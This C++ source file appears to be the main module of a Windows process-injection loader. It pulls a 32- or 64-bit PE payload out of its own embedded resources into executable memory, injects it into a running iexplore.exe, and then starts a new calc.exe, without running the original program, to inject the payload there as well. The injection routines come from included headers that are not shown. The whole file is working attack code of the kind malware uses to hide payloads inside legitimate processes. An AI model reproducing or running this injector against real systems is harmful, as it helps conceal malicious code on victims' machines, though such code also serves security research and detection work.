#include <windows.h>
#include <stdio.h>

#include "resource.h"
#include "peloader/inject_pe.h"
#include "target_util.h"
#include "process_util.h"
#include "sysutil.h"

BYTE* get_raw_payload(OUT SIZE_T &res_size, int res_id)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(res_id), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

HANDLE make_new_process(WCHAR* targetPath, BOOL run_original)
{
    //create target process:
    PROCESS_INFORMATION pi;
    if (create_new_process1(targetPath, pi, run_original) == NULL) {
        printf("Creating process failed!\n");
        return NULL;
    }
    printf("PID: %d\n", pi.dwProcessId);
    return pi.hProcess;
}

bool inject_into_running_process(WCHAR* targetName, BYTE* res_data, SIZE_T res_size)
{
    if (res_data == NULL || res_size == 0) return false;

    bool result = false;
    // find a process by name:
    HANDLE hProcess = find_running_process2(targetName);
    WCHAR targetPath[MAX_PATH] = { 0 };

    if (hProcess == NULL) {
        return false;
    }
    if (is_process_64b(hProcess) != is_process_64b()) {
        printf("32/64b mismatch!\n");
        CloseHandle(hProcess);
        return false;
    }

    if (inject_PE(hProcess, res_data, res_size)) {
        result = true;
    }
    CloseHandle(hProcess);
    return result;
}

bool inject_into_new_process(WCHAR* targetPath, BOOL run_original, BYTE* res_data, SIZE_T res_size)
{
    if (res_data == NULL || res_size == 0) return false;

    bool result = false;
    //TODO: check compatibility before deploying the process (from headers)

    //create a new process:
    HANDLE hProcess = make_new_process(targetPath, run_original);
    if (hProcess == NULL) {
        return false;
    }
    
    if (is_process_64b(hProcess) != is_process_64b()) {
        printf("32/64b mismatch!\n");
        CloseHandle(hProcess);
        return false;
    }

    if (inject_PE(hProcess, res_data, res_size)) {
        result = true;
    }
    CloseHandle(hProcess);
    return result;
}

int main(int argc, char *argv[])
{
    // 1. Choose the appropriate payload.
    // The loader can load only the payload with the same architecture as itself;
    // appropriately - 32bit loader can load 32 bit payload and 64 bit loader - 64bit payload
    BYTE* res_data = NULL;
    SIZE_T res_size = 0;
    if (is_process_64b()) {
        printf("payload 64 bit\n");
        if ((res_data = get_raw_payload(res_size, MY_RESOURCE64)) == NULL) {
            printf("Failed!\n");
            return -1;
        }
    }
    else {
        printf("payload 32 bit\n");
        if ((res_data = get_raw_payload(res_size, MY_RESOURCE32)) == NULL) {
            printf("Failed!\n");
            return -1;
        }
    }

    // 2. Find the running process by name and inject the payload there:
    if (inject_into_running_process(L"iexplore.exe", res_data, res_size)) {
        printf("[OK] Injected into running process!\n");
    }

    // 3. Create a new process and inject the payload there:
    HANDLE mainThread = NULL;
    WCHAR path[MAX_PATH] = { 0 };
    target::get_calc_path(path, MAX_PATH);

    //in case if the injection was made into a new process
    //we may like to run the original app also (or not)
    BOOL run_original = FALSE;
    if (inject_into_new_process(path, run_original, res_data, res_size)) {
        printf("[OK] Injected into a new process!\n");
    }

    //4. Free the resources
    VirtualFree(res_data, res_size, MEM_FREE);
    system("pause");
    return 0;
}
